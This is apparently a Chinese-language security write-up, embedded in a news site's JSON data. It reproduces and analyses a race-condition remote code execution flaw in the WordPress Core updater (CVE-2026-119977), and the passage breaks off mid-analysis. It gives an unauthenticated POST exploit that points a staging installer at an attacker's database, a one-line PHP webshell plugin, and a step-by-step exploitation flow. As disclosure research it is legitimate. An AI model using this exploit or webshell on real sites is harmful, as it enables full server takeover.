[{"_1":2,"_3":4},"root",{"_5":249},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":-5,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":57,"_58":59,"_60":61},"expiresAt",1794616832000,"id","p4onmtqqizwd1h17c3m9x1czt","title","WordPress Core 竞争条件远程代码执行漏洞 CVE-2026-119977 复现分析","originalTitle","WordPress Core竞争条件远程代码执行漏洞(CVE-2026-119977）","summary","作者复现并分析了 WordPress Core 竞争条件远程代码执行漏洞 CVE-2026-119977。","reason","文章从暂存目录、安装器与文件复制三个环节还原竞争条件，并提供可复现 PoC 和修复版本，便于理解漏洞成因与处置重点。","source",{"_72":248},"links",{"_238":247},"publishedAt","2026-11-13T06:24:36.000Z","discoveredAt","2026-11-13T12:56:28.930Z","timelineAt","category","disclosure","tags",[241,242,243,244,73,245,246],"score",84,"selected",true,"channel","news","story",{"_77":78,"_13":79},"x","readingMode","full","author","body",{"_61":237,"_238":-5,"_239":238,"_240":37},"outline",[80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130],"relatedStories",[76],"topics",[68,69],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation",false,"bodyLanguage","zh","factId","fWKObytvDQwc","reportCount",1,"additionalSourceCount",0,{"_70":74,"_72":75},{"_70":71,"_72":73},"slug","research","name","技术研究","vuln","漏洞披露",{"_77":78,"_13":79},"publicId","1219bb0c-7c46-49ac-8b88-3829783c0451","WordPress RCE漏洞确认遭在野利用",{"_11":235,"_132":236,"_134":135},{"_11":233,"_132":234,"_134":135},{"_11":231,"_132":232,"_134":135},{"_11":229,"_132":230,"_134":135},{"_11":227,"_132":228,"_134":135},{"_11":225,"_132":226,"_134":135},{"_11":223,"_132":224,"_134":144},{"_11":221,"_132":222,"_134":144},{"_11":219,"_132":220,"_134":135},{"_11":217,"_132":218,"_134":144},{"_11":215,"_132":216,"_134":144},{"_11":213,"_132":214,"_134":144},{"_11":211,"_132":212,"_134":144},{"_11":209,"_132":210,"_134":144},{"_11":207,"_132":208,"_134":144},{"_11":205,"_132":206,"_134":135},{"_11":203,"_132":204,"_134":144},{"_11":201,"_132":202,"_134":144},{"_11":199,"_132":200,"_134":144},{"_11":197,"_132":198,"_134":144},{"_11":195,"_132":196,"_134":144},{"_11":193,"_132":194,"_134":144},{"_11":191,"_132":192,"_134":144},{"_11":189,"_132":190,"_134":144},{"_11":187,"_132":188,"_134":144},{"_11":185,"_132":186,"_134":144},{"_11":183,"_132":184,"_134":144},{"_11":181,"_132":182,"_134":144},{"_11":179,"_132":180,"_134":144},{"_11":177,"_132":178,"_134":144},{"_11":175,"_132":176,"_134":135},{"_11":173,"_132":174,"_134":144},{"_11":171,"_132":172,"_134":144},{"_11":169,"_132":170,"_134":144},{"_11":167,"_132":168,"_134":144},{"_11":165,"_132":166,"_134":144},{"_11":163,"_132":164,"_134":144},{"_11":161,"_132":162,"_134":144},{"_11":159,"_132":160,"_134":144},{"_11":157,"_132":158,"_134":144},{"_11":155,"_132":156,"_134":144},{"_11":153,"_132":154,"_134":144},{"_11":151,"_132":152,"_134":144},{"_11":149,"_132":150,"_134":144},{"_11":147,"_132":148,"_134":144},{"_11":145,"_132":146,"_134":144},{"_11":142,"_132":143,"_134":144},{"_11":140,"_132":141,"_134":135},{"_11":138,"_132":139,"_134":135},{"_11":136,"_132":137,"_134":135},{"_11":131,"_132":133,"_134":135},"sec-51","text","附录二","level",2,"sec-50","附录一","sec-49","十一、参考链接","sec-48","十、修复措施","sec-47","16、对比：7.1.3 升 7.1.4 改了什么",3,"sec-46","15、完整总结","sec-45","14、窗口：checksums 的外网请求","sec-44","13、copy_dir：复制开始才拍快照","sec-43","12、目标 7.1.3：skip 名单里没有 wp-config.php","sec-42","11、关键：复制逻辑来自“目标版本”","sec-41","10、连接与落盘：把攻击者参数写进暂存配置","sec-40","9、输入：四个数据库字段全部来自 POST","sec-39","8、安装器：以“自己所在目录”为 ABSPATH","sec-38","7、暂存目录：在 Web 根下，且没有 index.php","sec-37","6、解压目录：basename 直接当目录名","sec-36","5、临时文件被改名","sec-35","4、临时文件名：6 位随机后缀","sec-34","3、下载：从官网获取更新包","sec-33","2、选包：四种候选，默认 full","sec-32","1、入口：后台点更新","sec-31","九、漏洞分析","sec-30","14、执行系统命令","sec-29","13、上传插件","sec-28","12、登录后台","sec-27","11、覆盖正式配置","sec-26","10、复制时拍快照","sec-25","9、校验和撑开窗口","sec-24","8、写入暂存配置","sec-23","7、安装器接受参数","sec-22","6、发送未认证 POST","sec-21","5、暂存目录可访问","sec-20","4、解压到暂存目录","sec-19","3、下载更新包","sec-18","2、管理员点更新","sec-17","1、攻击者提前轮询","sec-16","八、利用流程","sec-15","（6）访问插件执行命令","sec-14","（5）上传插件","sec-13","（4）接管后台","sec-12","（3）攻击成功","sec-11","（2）受害者登录后台、点击更新","sec-10","（1）准备poc，先不运行（poc脚本见附录）","sec-9","七、漏洞复现","sec-8","2、攻击者端","sec-7","1、受害者端","sec-6","六、环境搭建","sec-5","五、利用条件","sec-4","四、影响组件","sec-3","三、受影响版本","sec-2","二、漏洞详情","sec-1","一、背景","<h2 id=\"sec-1\">一、背景</h2><p>最近笔者看到某测绘平台在2026年11月的检索数据，WordPress Core 竞争条件远程代码执行漏洞(CVE-2026-119977)关联的全球风险资产总数为1219476个，关联IP总数为379271个，国内风险资产总数为48714个，关联IP总数为14700个。涉及的资产还挺多，竞争条件导致的远程代码执行，刚好有时间，在这里搭环境研究下。</p><p>（以下所有环境均为笔者本地搭建环境复现，根据文章内容可复现）</p><h2 id=\"sec-2\">二、漏洞详情</h2><p>CVE官网介绍：<a href=\"https://www.cve.org/CVERecord?id=CVE-2026-119977\">https://www.cve.org/CVERecord?id=CVE-2026-119977</a></p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143615-86bd0a0e-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=64262bd2ad88caf3\" loading=\"lazy\" decoding=\"async\" width=\"1191.1111426647808\"></p><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>Score</p></td><td colspan=\"1\" rowspan=\"1\"><p>Severity</p></td><td colspan=\"1\" rowspan=\"1\"><p>Version Vector String</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>8.1</p></td><td colspan=\"1\" rowspan=\"1\"><p>HIGH</p></td><td colspan=\"1\" rowspan=\"1\"><p>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H</p></td></tr></tbody></table><p>WordPress 核心程序 4.7 至 7.1.3 版本存在远程代码执行（RCE）漏洞。漏洞成因：完整内核包升级过程中，会生成可被外网访问、路径可预测的临时过渡目录。未经身份验证的攻击者可在升级窗口期内，在服务器上执行恶意代码。</p><p>该漏洞源于完整包核心升级过程中，升级程序将更新包解压至 wp-content/upgrade/ 下基于包名生成的可预测、Web 可访问临时目录（相关代码位于 class-wp-upgrader.php、class-core-upgrader.php、update-core.php 等）。临时目录包含安装程序 setup-config.php，且在升级窗口期间可被外部 HTTP 请求直接执行。攻击者可利用该漏洞，在升级窗口内通过竞争条件注入恶意配置，最终实现任意代码执行，导致服务器完全沦陷。</p><h2 id=\"sec-3\">三、受影响版本</h2><p>4.7.0 &lt;= WordPress &lt;= 4.7.38</p><p>4.8.0 &lt;= WordPress &lt;= 4.8.33</p><p>4.9.0 &lt;= WordPress &lt;= 4.9.34</p><p>5.0.0 &lt;= WordPress &lt;= 5.0.30</p><p>5.1.0 &lt;= WordPress &lt;= 5.1.27</p><p>5.2.0 &lt;= WordPress &lt;= 5.2.29</p><p>5.3.0 &lt;= WordPress &lt;= 5.3.26</p><p>5.4.0 &lt;= WordPress &lt;= 5.4.24</p><p>5.5.0 &lt;= WordPress &lt;= 5.5.23</p><p>5.6.0 &lt;= WordPress &lt;= 5.6.22</p><p>5.7.0 &lt;= WordPress &lt;= 5.7.20</p><p>5.8.0 &lt;= WordPress &lt;= 5.8.18</p><p>5.9.0 &lt;= WordPress &lt;= 5.9.19</p><p>6.0.0 &lt;= WordPress &lt;= 6.0.17</p><p>6.1.0 &lt;= WordPress &lt;= 6.1.15</p><p>6.2.0 &lt;= WordPress &lt;= 6.2.14</p><p>6.3.0 &lt;= WordPress &lt;= 6.3.13</p><p>6.4.0 &lt;= WordPress &lt;= 6.4.13</p><p>6.5.0 &lt;= WordPress &lt;= 6.5.13</p><p>6.6.0 &lt;= WordPress &lt;= 6.6.10</p><p>6.7.0 &lt;= WordPress &lt;= 6.7.10</p><p>6.8.0 &lt;= WordPress &lt;= 6.8.11</p><p>6.9.0 &lt;= WordPress &lt;= 6.9.10</p><p>7.0.0 &lt;= WordPress &lt;= 7.0.7</p><p>7.1.0 &lt;= WordPress &lt;= 7.1.3</p><h2 id=\"sec-4\">四、影响组件</h2><p>WordPress 是全球最广泛使用的开源内容管理系统（CMS），基于 PHP 和 MySQL/MariaDB 构建，提供文章发布、页面管理、媒体库、插件扩展与主题换肤等完整建站能力。它既可通过 <a href=\"http://wordpress.org/\">WordPress.org</a> 官方托管服务使用，也可免费下载自建于各类 Web 服务器环境，凭借丰富的生态和易用性成为个人博客、企业官网、新闻媒体及电商平台的主流选择，目前为全球约 43% 的网站提供底层支撑。</p><h2 id=\"sec-5\">五、利用条件</h2><p>1、正在执行完整包核心升级更新。</p><p>2、暂存目录可公开访问。</p><p>3、暂存路径可预测。</p><h2 id=\"sec-6\">六、环境搭建</h2><h3 id=\"sec-7\">1、受害者端</h3><p>Apache v2.4.39</p><p>MySQL v8.0.12（地址：127.0.0.1，端口：3306）</p><p>Wordpress v7.1.2 （测试将v7.1.2版本升级到v7.1.3）</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143616-870943e3-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=638d379855624d36\" loading=\"lazy\" decoding=\"async\" width=\"643.333350375847\"><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143616-874e41b0-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=046c08c82cd516a4\" loading=\"lazy\" decoding=\"async\" width=\"1393.3333702440625\"></p><h3 id=\"sec-8\">2、攻击者端</h3><p>因为笔者是在同一天机器上做测试，攻击侧数据库的端口为3307，真实攻击里，3307 对应的就是攻击者自己 VPS 上的 MySQL。</p><p>MySQL v8.0.12（地址：127.0.0.1，端口：3307）,库名evil712，其中包含三张表，这里笔者测试最少需要三张，保持替换后可登录后台并上传恶意插件执行系统命令。</p><p>（具体的建表sql可以参考附录）</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143617-8794f444-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=d32b5520c1bd8509\" loading=\"lazy\" decoding=\"async\" width=\"1070.0000283453207\"></p><p>使用该数据库替换掉受害者的数据库。</p><h2 id=\"sec-9\">七、漏洞复现</h2><h3 id=\"sec-10\">（1）准备poc，先不运行（poc脚本见附录）</h3><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143617-87cdad35-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=6038515db4c6d757\" loading=\"lazy\" decoding=\"async\" width=\"814.4444660198548\"></p><pre><code>POST /wp-content/upgrade/wordpress-7.1.3/wordpress/wp-admin/setup-config.php?step=2&amp;noapi=1 HTTP/1.1\nHost: wp712.com\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 91\n\ndbname=evil712&amp;uname=evil&amp;pwd=evilpass&amp;dbhost=127.0.0.1%3A3307&amp;prefix=wp_&amp;noapi=1&amp;language=</code></pre><h3 id=\"sec-11\">（2）受害者登录后台、点击更新</h3><p>用户名/密码：<code>siteadmin</code> / <code>SiteAdmin#2026</code>（内部测试环境，后面会替换掉该用户登录）</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143617-8816eb57-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=8e94b16bfe275feb\" loading=\"lazy\" decoding=\"async\" width=\"1390.000036822426\"><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143616-874e41b0-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=046c08c82cd516a4\" loading=\"lazy\" decoding=\"async\" width=\"1393.3333702440625\"></p><p>当前版本7.1.2，点击“Update to version 7.1.3”，接着快速运行poc</p><h3 id=\"sec-12\">（3）攻击成功</h3><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143618-885753fb-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=8f1605ad3a95dcaf\" loading=\"lazy\" decoding=\"async\" width=\"823.3333551442188\"></p><p>替换数据库，新增用户attacker/Attacker#2026</p><h3 id=\"sec-13\">（4）接管后台</h3><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143618-889a8a01-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=bd9e6e4674821658\" loading=\"lazy\" decoding=\"async\" width=\"1391.1111479629715\"><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143619-88e47569-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=42588c4421e35aec\" loading=\"lazy\" decoding=\"async\" width=\"1387.777814541335\"></p><p>版本已经升级到7.1.3</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143619-892917e0-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=f14ad3b7248e125a\" loading=\"lazy\" decoding=\"async\" width=\"1392.222259103517\"></p><h3 id=\"sec-14\">（5）上传插件</h3><p>插件使用压缩包的形式上传，内容如下：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143620-89665ad9-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=743e006c87c2156c\" loading=\"lazy\" decoding=\"async\" width=\"701.1111296842132\"></p><pre><code>&lt;?php\n\nif ( isset( $_GET['c'] ) ) {\n\techo shell_exec( $_GET['c'] );\n}\n</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143620-89a4c10f-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=8116a91ad6c557ec\" loading=\"lazy\" decoding=\"async\" width=\"1374.444480854789\"><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143621-89e5eceb-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=bf51020ea5260523\" loading=\"lazy\" decoding=\"async\" width=\"1385.5555922602439\"></p><h3 id=\"sec-15\">（6）访问插件执行命令</h3><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143621-8a201e53-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=bbbe79479bee5a72\" loading=\"lazy\" decoding=\"async\" width=\"1383.3333699791528\"></p><p><strong>成功执行系统命令，漏洞复现完成！</strong></p><h2 id=\"sec-16\">八、利用流程</h2><h3 id=\"sec-17\">1、攻击者提前轮询</h3><p>在管理员操作之前，持续请求目标站点的 wp-content/upgrade/ 和暂存安装器路径，等待升级开始。</p><h3 id=\"sec-18\">2、管理员点更新</h3><p>在后台点击“更新到 7.1.3”，WordPress 进入核心升级流程，向 <a href=\"http://downloads.wordpress.org/\">downloads.wordpress.org</a> 请求更新包。</p><h3 id=\"sec-19\">3、下载更新包</h3><p>官网返回 <a href=\"http://wordpress-7.1.3.zip/\">wordpress-7.1.3.zip</a>，并带 Content-Disposition: filename=<a href=\"http://wordpress-7.1.3.zip/\">wordpress-7.1.3.zip</a>，download_url() 据此把临时文件重命名。</p><h3 id=\"sec-20\">4、解压到暂存目录</h3><p>升级器把包解压到 wp-content/upgrade/wordpress-7.1.3/，目录名直接来自包文件名，可预测。</p><h3 id=\"sec-21\">5、暂存目录可访问</h3><p>该目录在 Web 根下，且没有禁止 PHP 执行，攻击者可以直接请求里面的 setup-config.php。</p><h3 id=\"sec-22\">6、发送未认证 POST</h3><p>攻击者向暂存安装器提交 dbname、uname、pwd、dbhost 等参数，不需要任何登录。</p><h3 id=\"sec-23\">7、安装器接受参数</h3><p>暂存副本没有 wp-config.php，安装器认为站点未安装，于是用攻击者给的参数去连数据库。</p><h3 id=\"sec-24\">8、写入暂存配置</h3><p>连接攻击者 MySQL 成功后，安装器把这些参数写进暂存目录的 wp-config.php。</p><h3 id=\"sec-25\">9、校验和撑开窗口</h3><p>升级器在复制前请求官方校验和，这个外网请求让“解压完成”到“开始复制”之间多出几秒。</p><h3 id=\"sec-26\">10、复制时拍快照</h3><p>copy_dir() 在复制开始时才读取目录，攻击者刚写下的 wp-config.php 因此进入快照。</p><h3 id=\"sec-27\">11、覆盖正式配置</h3><p>快照被复制到站点根目录，正式的 wp-config.php 被替换，站点改为连接攻击者的数据库。</p><h3 id=\"sec-28\">12、登录后台</h3><p>站点从攻击者库读取 wp_users 和角色，攻击者用 attacker / Attacker#2026 登录，成为 administrator。</p><h3 id=\"sec-29\">13、上传插件</h3><p>管理员本来就能上传插件，攻击者传入一个含 PHP 的插件包，文件落到 wp-content/plugins/。</p><h3 id=\"sec-30\">14、执行系统命令</h3><p>wp-content/plugins/目录下php文件可直接访问执行。</p><h2 id=\"sec-31\">九、漏洞分析</h2><h3 id=\"sec-32\">1、入口：后台点更新</h3><p>wp-admin/update-core.php -&gt; do_core_upgrade()</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143621-8a6bbd8f-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=692c8d20349780b1\" loading=\"lazy\" decoding=\"async\" width=\"1867.7778272569929\"></p><p>点击更新，会传给do_core_upgrade()函数version=7.1.3&amp;locale=en_US，接着传值给find_core_update()</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143622-8ab4e6e8-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=8e513d1f88ab2e68\" loading=\"lazy\" decoding=\"async\" width=\"915.5555798094956\"></p><pre><code>$version = $_POST['version'] ?? false;\n$locale  = $_POST['locale'] ?? 'en_US';\n$update  = find_core_update( $version, $locale );</code></pre><p>wp-admin/includes/update.php -&gt; find_core_update()</p><pre><code>221: function find_core_update( $version, $locale ) {\n222: \t$from_api = get_site_transient( 'update_core' );\n223: \tif ( ! isset( $from_api-&gt;updates ) || ! is_array( $from_api-&gt;updates ) ) {\n224: \t\treturn false;\n225: \t}\n226: \t$updates = $from_api-&gt;updates;\n227: \tforeach ( $updates as $update ) {\n228: \t\tif ( $update-&gt;current === $version &amp;&amp; $update-&gt;locale === $locale ) {\n229: \t\t\treturn $update;\n230: \t\t}\n231: \t}\n232: \treturn false;</code></pre><p>find_core_update()的作用是在 update_core 这个 transient 的更新列表里，按“版本 + 语言”精确查找一条更新记录，找到返回整个对象，找不到返回 false。</p><p>这里是在本地数据库里找，默认升级到7.1.4版本。</p><pre><code>SELECT option_name, option_value\nFROM t712_options\nWHERE option_name LIKE '%update_core%';</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143622-8af5ae64-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=1d7d6f0caa71a400\" loading=\"lazy\" decoding=\"async\" width=\"1065.5555837831387\"></p><p>这里笔者没有使用默认的升级方式，因为复现漏洞需要从7.1.2-&gt;7.1.3版本，这里使用插件完成阻拦替换</p><p><strong>使用pin-upgrade.php插件，返回挂 pre_site_transient_update_core，强制返回 7.1.3 的更新 offer。</strong></p><pre><code>https://downloads.wordpress.org/release/wordpress-7.1.3.zip</code></pre><h3 id=\"sec-33\">2、选包：四种候选，默认 full</h3><p>wp-admin/includes/class-core-upgrader.php -&gt; upgrade()</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143623-8b3407e7-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=9e2355c2ea86e989\" loading=\"lazy\" decoding=\"async\" width=\"827.7777997064007\"></p><pre><code>109: \t\tif ( $parsed_args['do_rollback'] &amp;&amp; $current-&gt;packages-&gt;rollback ) {\n...\n116: \t\t} elseif ( $current-&gt;packages-&gt;no_content ) {\n117: \t\t\t$to_download = 'no_content';\n118: \t\t} else {\n119: \t\t\t$to_download = 'full';\n120: \t\t}</code></pre><p>候选有 rollback、partial、new_bundled、no_content、full。</p><p><strong>pin-upgrade.php插件</strong> 里 partial=false、no_content=false、new_bundled=false，所以落到 $to_download = 'full'。选定后调用 download_package()。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143623-8b6ebbd7-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=ce8f16a323910f13\" loading=\"lazy\" decoding=\"async\" width=\"843.3333556740379\"></p><pre><code>$download = $this-&gt;download_package( $current-&gt;packages-&gt;$to_download, false );</code></pre><p>接着再看download_package()函数如何获取文件</p><h3 id=\"sec-34\">3、下载：从官网获取更新包</h3><p>wp-admin/includes/class-wp-upgrader.php -&gt; download_package()</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143624-8bb65b3c-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=7aa8a2898a87a567\" loading=\"lazy\" decoding=\"async\" width=\"1063.3333615020476\"></p><pre><code>\n\t\tif ( ! preg_match( '!^(http|https|ftp)://!i', $package ) &amp;&amp; file_exists( $package ) ) { // Local file or remote?\n\t\t\treturn $package; // Must be a local file.\n\t\t}\n\n    $download_file = download_url( $package, 300, $check_signatures );\n</code></pre><p>值是 https 开头，本地文件分支不成立，走 download_url。</p><p>进入download_url()函数：</p><p>wp-admin/includes/file.php -&gt; download_url()</p><pre><code>1172: \t$tmpfname = wp_tempnam( $url_filename );</code></pre><p>再看wp_tempnam()函数</p><h3 id=\"sec-35\">4、临时文件名：6 位随机后缀</h3><p>wp-admin/includes/file.php -&gt; wp_tempnam()</p><pre><code>$temp_filename = basename( $filename );\n$temp_filename = preg_replace( '|\\.[^.]*$|', '', $temp_filename );\n...\n$temp_filename .= '-' . wp_generate_password( 6, false );\n$temp_filename .= '.tmp';</code></pre><p>先取包名、去掉扩展名，得到 wordpress-7.1.3，再拼 - 加 6 位随机字符和 .tmp。下载到本地的文件因此形如 wordpress-7.1.3-AbC123.tmp。下载完成后 Content-Disposition 会该会重命名，接着往下</p><h3 id=\"sec-36\">5、临时文件被改名</h3><p>wp-admin/includes/file.php -&gt; download_url()</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261113143624-8bfd771e-df2c-1.png&amp;mode=full&amp;exp=1794873600&amp;sig=ac594ce06f68dc25\" loading=\"lazy\" decoding=\"async\" width=\"1050.0000278155017\"></p><pre><code>$content_disposition = wp_remote_retrieve_header( $response, 'Content-Disposition' );\n\n\tif ( $content_disposition ) {\n\t\t$content_disposition = strtolower( $content_disposition );\n\n\t\tif ( str_starts_with( $content_disposition, 'attachment; filename=' ) ) {\n\t\t\t$tmpfname_disposition = sanitize_file_name( substr( $content_disposition, 21 ) );\n\t\t} else {\n\t\t\t$tmpfname_disposition = '';\n\t\t}\n</code></pre><p><a href=\"http://xn--wordpress-7-km8qo27l876bnjxh.1.3-abc123.xn--tmpwordpress-7-2w7v363enwbh605c.1.3.zip/\">这一步将wordpress-7.1.3-AbC123.tmp重命名为wordpress-7.1.3.zip</a>，文件名可确定。</p><h3 id=\"sec-37\">6、解压目录：basename 直接当目录名</h3><p>wp-admin/includes/class-wp-upgrader.php -&gt; unpack_package()</p><pre><code>$working_dir = $this-&gt;unpack_package( $download );</code></pre><pre><code>$upgrade_folder = $wp_filesystem-&gt;wp_content_dir() . 'upgrade/';\n$working_dir = $upgrade_folder . basename( basename( $package, '.tmp' ), '.zip' );\n$result = unzip_file( $package, $working_dir );</code></pre><p>先把 upgrade 目录清空），再用包文件名去掉 .tmp/.zip 当目录名。包叫 <a href=\"http://wordpress-7.1.3.zip/\">wordpress-7.1.3.zip</a>，目录就是 wp-content/upgrade/wordpress-7.1.3/。</p><h3 id=\"sec-38\">7、暂存目录：在 Web 根下，且没有 index.php</h3><p>wp-admin/includes/class-wp-upgrader.php -&gt; unpack_package()</p><pre><code>369: \t\t// Clean up contents of upgrade directory beforehand.\n370: \t\t$upgrade_files = $wp_filesystem-&gt;dirlist( $upgrade_folder );\n371: \t\tif ( ! empty( $upgrade_files ) ) {\n372: \t\t\tforeach ( $upgrade_files as $file ) {\n373: \t\t\t\t$wp_filesystem-&gt;delete( $upgrade_folder . $file['name'], true );</code></pre><p>wp_content_dir() 就是站点根下的 wp-content/，所以 upgrade 目录天然可被 Web 访问。7.1.4 之前这里既不放 index.php，也不拒绝 PHP，清空时还会把所有内容都删掉、不留占位文件。如果服务器开了目录列表，攻击者能直接看到 wordpress-7.1.3/。</p><h3 id=\"sec-39\">8、安装器：以“自己所在目录”为 ABSPATH</h3><p>wp-admin/setup-config.php -&gt; 文件顶层</p><pre><code>30: \tdefine( 'ABSPATH', dirname( __DIR__ ) . '/' );\n33: \trequire ABSPATH . 'wp-settings.php';\n...\n59: if ( file_exists( ABSPATH . 'wp-config.php' ) ) {</code></pre><p>ABSPATH 是 setup-config.php 自己所在的目录，也就是暂存目录，不是正式站点根。升级包本身不带 wp-config.php，所以第 59 行判断为假，安装器认为这是一个全新站点，继续走安装流程。</p><h3 id=\"sec-40\">9、输入：四个数据库字段全部来自 POST</h3><p>wp-admin/setup-config.php -&gt; case 2</p><pre><code>282: \t\t$dbname = trim( wp_unslash( $_POST['dbname'] ) );\n283: \t\t$uname  = trim( wp_unslash( $_POST['uname'] ) );\n284: \t\t$pwd    = trim( wp_unslash( $_POST['pwd'] ) );\n285: \t\t$dbhost = trim( wp_unslash( $_POST['dbhost'] ) );\n286: \t\t$prefix = trim( wp_unslash( $_POST['prefix'] ) );</code></pre><p>没有 nonce、没有登录校验、没有来源检查；prefix 只做了空值和字符集校验。任何人只要能访问这个文件，就能提交自己的数据库参数。</p><h3 id=\"sec-41\">10、连接与落盘：把攻击者参数写进暂存配置</h3><p>wp-admin/setup-config.php -&gt; case 2 与写文件</p><pre><code>317: \t\tdefine( 'DB_NAME', $dbname );\n...\n325: \t\trequire_wp_db();\n331: \t\t$wpdb-&gt;db_connect();\n...\n469: \t\t\t$handle        = fopen( $path_to_wp_config, 'w' );\n477: \t\t\t\t\tfwrite( $handle, $line );</code></pre><p>先按攻击者的参数连数据库，连接失败就 wp_die；成功则把参数写进暂存目录的 wp-config.php。到这里，攻击者已经控制了一份“升级目录里的配置文件”。这里写进暂存目录的文件，怎么会被当成升级内容，接着向下分析。</p><h3 id=\"sec-42\">11、关键：复制逻辑来自“目标版本”</h3><p>wp-admin/includes/class-core-upgrader.php -&gt; upgrade()</p><pre><code>163: \t\tif ( ! $wp_filesystem-&gt;copy( $working_dir . '/wordpress/wp-admin/includes/update-core.php', $wp_dir . 'wp-admin/includes/update-core.php', true ) ) {\n...\n171: \t\trequire_once ABSPATH . 'wp-admin/includes/update-core.php';\n...\n178: \t\t$result = update_core( $working_dir, $wp_dir );</code></pre><p>解压后，升级器先把新包里的 update-core.php 覆盖到站点并 require。也就是说，接下来执行复制的是目标版本的代码，不是当前正在跑的版本。7.1.2 升 7.1.3，执行的是 7.1.3 的 update_core()。</p><h3 id=\"sec-43\">12、目标 7.1.3：skip 名单里没有 wp-config.php</h3><p>wp-admin/includes/update-core.php -&gt; update_core()</p><pre><code>1549: \t$skip = array( 'wp-content', 'wp-includes/version.php' );\n...\n1639: \t$result = copy_dir( $from . $distro, $to, $skip );</code></pre><p>跳过名单只有 wp-content 和 version.php。wp-config.php 不在名单里，只要它出现在要复制的目录中，就会被复制到站点根目录。接着看 copy_dir 是什么时候读目录的</p><h3 id=\"sec-44\">13、copy_dir：复制开始才拍快照</h3><p>wp-admin/includes/file.php -&gt; copy_dir()</p><pre><code>2025: \t$dirlist = $wp_filesystem-&gt;dirlist( $from 